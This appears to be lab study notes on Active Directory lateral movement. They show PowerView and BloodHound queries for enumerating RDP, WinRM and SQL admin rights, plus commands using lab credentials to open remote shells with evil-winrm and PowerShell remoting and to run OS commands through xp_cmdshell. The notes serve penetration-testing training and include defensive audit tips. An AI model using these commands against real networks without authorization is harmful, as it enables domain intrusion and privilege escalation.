# Privileged Access: Lateral Movement in AD

Once you gain a foothold in an Active Directory (AD) environment, your goal shifts to moving laterally or vertically to access more hosts and ultimately compromise the domain or achieve your assessment objectives.

## Classic Lateral Movement: Pass-the-Hash
- **If you compromise an account with local admin rights on a host (or hosts):**
  - You can perform a **Pass-the-Hash** attack to authenticate via SMB and move laterally.

## What If You Don't Have Local Admin Rights?
There are several other ways to move around a Windows domain:

- **Remote Desktop Protocol (RDP):** GUI access to a target host.
- **PowerShell Remoting (WinRM/PSRemoting):** Run commands or get an interactive shell on a remote host.
- **MSSQL Server:** An account with sysadmin privileges can log in remotely and execute queries or OS commands as the SQL Server service account.

## Enumerating Remote Access Rights
- **BloodHound** is the fastest way to enumerate remote access rights. Look for these edges:
  - `CanRDP`
  - `CanPSRemote`
  - `SQLAdmin`
- **PowerView** and built-in tools can also enumerate these privileges.

---

## Scenario Setup
- **Windows attack host:** RDP into MS01.
- **Linux attack host:** SSH to `172.16.5.225` (`htb-student:HTB_@cademy_stdnt!`).
- **Try all methods:**
  - Windows: `Enter-PSSession`, `PowerUpSQL`
  - Linux: `evil-winrm`, `mssqlclient.py`

---

## 1. Remote Desktop Protocol (RDP)

- **Goal:** Access hosts via GUI, escalate privileges, or collect sensitive data.
- **Requirement:** User must be in the "Remote Desktop Users" group or have local admin rights.

### Why RDP Access Matters
- RDP access allows:
  - Launching further attacks from a new host
  - Privilege escalation (e.g., via credential theft or local exploits)
  - Pillaging the host for sensitive data or credentials
- Even non-admin users with RDP rights can be valuable footholds, especially on jump hosts or RDS servers.

### Enumerate RDP Access
**PowerView:**
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
*Example Output:*
```
ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```
- If "Domain Users" is present, all users can RDP to the host. This is common on RDS/jump hosts and can expose sensitive data or privilege escalation vectors.

**BloodHound:**
- Check for `CanRDP` edges.
- Run built-in queries: "Find Workstations where Domain Users can RDP" or "Find Servers where Domain Users can RDP".
- After gaining a user (e.g., via LLMNR/NBT-NS spoofing or Kerberoasting), search for their remote access rights in BloodHound (Node Info tab, Execution Rights section).
- **Custom Cypher Query to find all users who can RDP:**
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanRDP*1..]->(c:Computer) RETURN p2
```
- Use the Node Info tab for a user to see direct and group-inherited RDP rights (e.g., "Group Delegated RDP Privileges").

**Defensive Note:**
- Blue teams should regularly audit RDP rights using BloodHound and PowerView to catch over-permissive access (e.g., all Domain Users).

**Testing RDP:**
- Windows: `mstsc.exe`
- Linux: `xfreerdp`, `Remmina`
- If you have credentials, try RDPing to the host. If you lack local admin but have RDP, you may still be able to:
  - Dump credentials from memory (e.g., with Mimikatz)
  - Escalate via local privilege escalation exploits

---

## 2. PowerShell Remoting (WinRM)

- **Goal:** Run commands or get an interactive shell on remote hosts.
- **Requirement:** User must be in the "Remote Management Users" group or have WinRM rights.

### Why WinRM Access Matters
- WinRM access allows remote command execution and interactive PowerShell sessions.
- Non-admin WinRM access can be used for reconnaissance, data theft, or privilege escalation.
- The "Remote Management Users" group (since Windows 8/Server 2012) allows WinRM without local admin rights.

### Enumerate WinRM Access
**PowerView:**
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```
*Example Output:*
```
ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

**BloodHound Cypher Query:**
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
- Use this query to find all users who can WinRM into computers.
- Add as a custom query in BloodHound for quick access.
- Use the Node Info tab for a user to see direct and group-inherited WinRM rights.

**Defensive Note:**
- Blue teams should audit WinRM rights and restrict "Remote Management Users" group membership.

### Establishing a WinRM Session
**Windows:**
```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```
**Linux:**
- Install: `gem install evil-winrm`
- Usage: `evil-winrm -i <IP> -u <USER>`
- Example:
```bash
evil-winrm -i 10.129.201.234 -u forend
```
- Enter password when prompted. You will get a PowerShell prompt on the remote host.
- Use `evil-winrm`'s help menu for advanced options (e.g., file upload, script execution).

---

## 3. SQL Server (MSSQL) Admin Access

- **Goal:** Execute queries or OS commands as the SQL service account (often privileged).
- **Requirement:** User with `sysadmin` rights on SQL Server.

### Why SQL Admin Access Matters
- SQL service accounts often have high privileges (sometimes SYSTEM).
- Gaining SQL admin can allow OS command execution, lateral movement, and privilege escalation.
- Credentials may be found via Kerberoasting, config files, or other attacks.

### Enumerate SQL Admin Access
**BloodHound Cypher Query:**
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
- Use this query to find all users with SQL admin rights over computers.
- Check the Node Info tab for a user to see SQLAdmin rights.
- Example: User `damundsen` has SQLAdmin rights over `ACADEMY-EA-DB01`.

### Using PowerUpSQL (Windows)
```powershell
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```
- Use `Get-SQLInstanceDomain` to enumerate SQL instances.
- Use `Get-SQLQuery` to run queries as the SQL admin user.

### Using mssqlclient.py (Linux)
```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
- Type `help` for available commands (e.g., `enable_xp_cmdshell`, `xp_cmdshell whoami /priv`).
- Example session:
```sql
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```
- Look for `SeImpersonatePrivilege` (can be used for SYSTEM-level escalation with tools like JuicyPotato, PrintSpoofer, RoguePotato).

**Defensive Note:**
- Blue teams should monitor for use of `xp_cmdshell` and restrict SQL admin rights.
- Regularly audit for exposed SQL credentials in config files and scripts.

---

## Practical Tips
- Always re-enumerate rights after gaining new credentials or host access.
- BloodHound is invaluable for quickly mapping remote access and escalation paths.
- Test SQL credentials found in config files against MSSQL servers—often leads to SYSTEM access.
- Privilege escalation is often possible even without initial local admin rights—enumerate thoroughly!
- Use Node Info and custom Cypher queries in BloodHound to quickly identify attack paths.

---

## Summary
- Focus on RDP, WinRM, and SQLAdmin rights for lateral movement.
- Use PowerView and BloodHound for enumeration.
- Use practical tools (evil-winrm, mssqlclient.py, PowerUpSQL) for exploitation.
- Regularly audit and restrict remote access rights to reduce attack surface.

*Next: Common WinRM connection issues and troubleshooting.* 